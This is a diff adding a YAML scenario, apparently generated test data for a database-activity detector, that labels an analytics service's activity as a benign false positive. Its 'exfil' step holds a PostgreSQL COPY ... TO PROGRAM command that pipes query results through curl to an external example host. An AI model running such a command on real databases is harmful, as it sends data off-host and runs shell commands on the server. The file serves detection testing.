@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_44_sql_injection_ben_1209b
+family_id: gen_ecommerce_44_sql_injection_fam_1209
+domain: ecommerce
+time_of_day: '12:40'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT product_id, name FROM products WHERE order_id = 87795
+  - step_id: exfil
+    sql: COPY (SELECT product_id, name FROM products WHERE status = 'flagged') TO
+      PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.164
+      port: 443
+matched_pair_id: gen_ecommerce_44_sql_injection_pair_1209
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
